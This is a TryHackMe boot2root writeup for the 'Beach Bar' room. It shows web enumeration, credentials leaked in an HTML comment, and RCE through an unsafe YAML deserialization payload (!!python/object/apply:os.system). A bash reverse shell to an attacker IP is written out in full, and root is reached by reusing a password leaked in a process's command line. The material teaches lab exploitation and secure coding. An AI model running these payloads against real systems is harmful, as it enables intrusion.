# Beach Bar (Byte Lotus) — TryHackMe Writeup

> **A note on flags & files:** In line with responsible disclosure norms, this writeup does not publish any challenge files the organizers prohibit sharing, and flag values are redacted below. If you're stuck, use this as a methodology guide and derive your own flag by following the steps on your own instance of the room.

---

## Challenge Name
**Beach Bar** (Byte Lotus series)

## Category
Web Exploitation / Boot2Root

## Difficulty
Easy–Medium

## Description
Beach Bar is a boot2root machine built around a small Flask web app for a beachside bar's DJ booth. The app lets a logged-in "DJ" export the current playlist as YAML and re-import a modified version. The core vulnerability is unsafe YAML deserialization, which leads to remote code execution on the box. Privilege escalation hinges on a classic real-world mistake: a sensitive credential exposed in a running process's command-line arguments, reused as the root account's password.

Goals:
- [ ] Find the user flag
- [ ] Find the root flag

---

## Tools Used
- `nmap` — port/service enumeration
- `gobuster` — directory/endpoint brute-forcing
- `curl` — crafting and sending raw HTTP requests (login, export, import)
- Browser DevTools — inspecting session cookies
- `nc` (netcat) — catching the reverse shell
- `tcpdump` — diagnosing why the reverse shell wasn't connecting
- `ufw` / `iptables` — identifying and fixing a local firewall issue
- Python 3 (`pty` module) — upgrading to a full TTY shell

---

## Methodology

The approach followed the standard boot2root flow:

1. **Recon** — find open ports and identify the web technology stack.
2. **Enumerate the web app** — find hidden routes, login mechanisms, and any exposed source (HTML comments, JS, config leaks).
3. **Gain initial foothold** — look for weak/default credentials or an injectable feature.
4. **Identify and exploit the core vulnerability** — in this case, unsafe YAML deserialization in an import/export feature.
5. **Establish a reverse shell** — and troubleshoot connectivity issues methodically (this ended up being the trickiest part, and a great lesson in itself).
6. **Enumerate for privilege escalation** — check `sudo -l`, SUID binaries, running processes, systemd services, and cron jobs.
7. **Escalate to root** — via a leaked credential.

---

## Step-by-Step Solution

### 1. Port scanning
```bash
nmap -sC -sV -p- <TARGET_IP>
```
Results showed only two open ports:
- `22/tcp` — OpenSSH
- `80/tcp` — HTTP, running on **Gunicorn** (a strong signal this is a Python/Flask backend), with the title "Beach Bar // Sign in" and a redirect to `/login`.

**Lesson applied:** Gunicorn as the `Server` header is a big clue — it tells you the app is Python-based before you've even opened a browser, which shapes your assumptions about likely vulnerability classes (e.g., `pickle`/`yaml` deserialization, Jinja2 SSTI, Flask session forgery).

---

### 2. Inspecting the login page source
Viewing the raw HTML of `/login` revealed a developer note left in an HTML comment:

```html
<!-- staff note: the demo DJ login is still enabled for the soft opening. dj / dj -- swap this before the season starts (ticket BAR-7) -->
```

This is a textbook example of **sensitive information disclosure via HTML comments** — a very common real-world finding, not just a CTF trope.

---

### 3. Directory enumeration
```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -x php,txt,py,json
```
Found:
- `/dashboard` (auth required)
- `/import` (auth required)
- `/export` (auth required)
- `/logout`

---

### 4. Authenticating and exploring the app
Logged in via the browser (or `curl`) using the leaked credentials `dj / dj`. Grabbed the resulting Flask session cookie from browser DevTools (Storage → Cookies) for use in subsequent `curl` requests.

The dashboard revealed the key feature: playlists could be **exported as YAML**, edited, and **re-imported**. This "export → tweak → import" workflow is exactly the pattern to be suspicious of — it usually means a file or blob of data goes straight into a parser without proper sanitization.

Grabbed a legitimate export for reference:
```bash
curl -c cookies.txt -d "username=dj&password=dj" http://<TARGET_IP>/login
curl -b cookies.txt http://<TARGET_IP>/export -o playlist.yaml
cat playlist.yaml
```

Sample structure:
```yaml
playlist:
  name: Sunset Session
  vibe: golden hour
  tracks:
    - artist: Khruangbin
      title: Maria Tambien
    - artist: Men I Trust
      title: Show Me How
    - artist: Crumb
      title: Locket
```

Checked the `/import` page's HTML to find the exact form field names:
```html
<textarea name="playlist"></textarea>
<input type="file" name="playlist_file">
```

---

### 5. Identifying and confirming the vulnerability
YAML in Python has a well-known footgun: `yaml.load()` (without specifying `Loader=yaml.SafeLoader`) can deserialize arbitrary Python objects using tags like `!!python/object/apply:...`. This turns "just parsing data" into "executing arbitrary code."

**Confirmation test** — a harmless, unmodified export was re-submitted through `/import` first, to confirm the round-trip worked and to see how results were displayed:
```bash
curl -b "session=<COOKIE>" -F "playlist=<test.yaml" http://<TARGET_IP>/import
```
The app echoed the parsed Python dict back on the page — confirming it deserializes and displays whatever we send.

**Safe RCE confirmation** — before attempting a full reverse shell, a low-risk, non-blocking command was used to prove code execution without any networking side effects:
```yaml
    - artist: !!python/object/apply:os.system ["id > /tmp/pwned_confirm 2>&1"]
      title: pwn
```
The response showed `{'artist': 0, ...}` — the `0` is the exit code from `os.system()`, confirming the command ran successfully.

---

### 6. Getting a reverse shell (and troubleshooting it properly)
The first few reverse shell attempts caused `curl: (52) Empty reply from server`. Rather than guessing, this was debugged methodically:

1. **Backgrounded the shell command** so `os.system()` wouldn't hang the whole request:
   ```yaml
    - artist: !!python/object/apply:os.system ["setsid bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' &"]
      title: pwn
   ```
   This fixed the hanging response but the shell still didn't connect.

2. **Used `tcpdump` on the attacker box** to check for any inbound traffic at all:
   ```bash
   sudo tcpdump -i tun0 -n port 4444
   ```
   This showed the target's SYN packets arriving, but no SYN-ACK reply going back — meaning the connection reached the attacker machine but was being silently dropped **locally**.

3. **Checked the local firewall:**
   ```bash
   sudo iptables -L INPUT -n -v --line-numbers
   sudo ufw status verbose
   ```
   `ufw` was active with a default-deny inbound policy and only port 22 allowed — this was the actual root cause, entirely on the attacker side, not the target.

4. **Fixed it:**
   ```bash
   sudo ufw allow 4444/tcp
   ```

5. **Re-sent the payload** with a listener running:
   ```bash
   nc -lvnp 4444
   ```
   ```bash
   curl -b "session=<COOKIE>" -F "playlist=<evil.yaml" http://<TARGET_IP>/import
   ```
   This time, the shell connected successfully as user `bartender`.

**Lesson applied:** When an exploit *should* work but nothing happens, don't just tweak the payload repeatedly — verify each link in the chain independently (is the command executing? is the network path open? is anything actually listening?). `tcpdump` was the deciding diagnostic here.

---

### 7. Finding the user flag
```bash
ls -la /home/bartender/
cat /home/bartender/user.txt
```
`user.txt` was found directly in the home directory.

---

### 8. Privilege escalation enumeration
Checked the usual suspects:
```bash
sudo -l                       # needed a password we didn't have yet
find / -perm -4000 2>/dev/null   # no unusual SUID binaries
ps aux | grep -i python
```

The process list revealed something important — a root-owned daemon with a **plaintext password in its command-line arguments**:
```
root  608  ...  /opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass SunsetSpritz2024! --bitrate 320k
```

Command-line arguments of running processes are visible to any local user via `/proc/<pid>/cmdline` or `ps aux` — this is a very common real-world misconfiguration (secrets should be passed via environment variables, config files with restricted permissions, or a secrets manager — never as CLI flags).

The script file itself (`jukeboxd.py`) was **not** writable (owned by a different user), ruling out a "modify the script, wait for systemd to restart it as root" approach. That left one path: **credential reuse**.

---

### 9. Escalating to root
Since accounts are listed in `/etc/passwd`:
```bash
cat /etc/passwd | grep -v nologin
```
revealed `root`, `ubuntu`, and `bartender` as real login-capable accounts (no `dj` system user — that login only existed at the web-app level).

Tested the leaked password against each candidate account with `su`:
```bash
su - ubuntu     # failed
su - root       # succeeded
```

The daemon's stream password had been reused directly as the **root account's login password**.

```bash
cat /root/root.txt
```
Root flag obtained.

---

## Commands Used (Quick Reference)

```bash
# Recon
nmap -sC -sV -p- <TARGET_IP>
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -x php,txt,py,json

# Auth
curl -c cookies.txt -d "username=dj&password=dj" http://<TARGET_IP>/login
curl -b cookies.txt http://<TARGET_IP>/export -o playlist.yaml

# YAML RCE confirmation
curl -b "session=<COOKIE>" -F "playlist=<test.yaml" http://<TARGET_IP>/import

# Reverse shell (backgrounded)
nc -lvnp 4444
curl -b "session=<COOKIE>" -F "playlist=<evil.yaml" http://<TARGET_IP>/import

# Local firewall fix (attacker-side)
sudo tcpdump -i tun0 -n port 4444
sudo ufw status verbose
sudo ufw allow 4444/tcp

# TTY upgrade
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Privesc enumeration
sudo -l
find / -perm -4000 2>/dev/null
ps aux | grep -i python
cat /etc/passwd | grep -v nologin

# Privesc via credential reuse
su - root
```

---

## Lessons Learned

1. **Never use `yaml.load()` without a safe loader.** Always use `yaml.safe_load()` unless you have an explicit, well-understood reason not to — `yaml.load()` with the default/full `Loader` allows arbitrary Python object construction, which is equivalent to arbitrary code execution when fed untrusted input.

2. **HTML comments are not private.** Developer notes, TODOs, and "temporary" credentials left in page source are visible to anyone who views it — this is one of the simplest and most common real-world footholds.

3. **Debug exploits systematically, not by trial and error.** When a reverse shell payload "should" work but nothing happens, isolate each stage: is the remote command actually executing? Is there a network path? Is something actually listening on the port you expect? `tcpdump` and `ss -tlnp` are invaluable for this — and in this case, the failure was entirely on the *attacker's* side (a local firewall), not the exploit itself.

4. **Blocking commands can break RCE chains.** `os.system()` (and similar) waits for the command to exit before returning. Long-running commands like an interactive reverse shell need to be explicitly backgrounded (`setsid ... &`) or the calling process (and often the whole web request) will hang or time out.

5. **Never put secrets in command-line arguments.** Anything passed as a CLI flag is visible to every local user via `ps aux` or `/proc/<pid>/cmdline`. Secrets belong in environment variables (with restricted process access), dedicated secrets managers, or config files with tight file permissions — never in argv.

6. **Password reuse is still one of the most reliable privilege escalation paths.** A credential exposed for one purpose (a streaming daemon's internal auth) turned out to be reused verbatim for a completely different, far more privileged account (`root`). Always test any discovered credential against every plausible account, not just the one it was "meant" for.

---
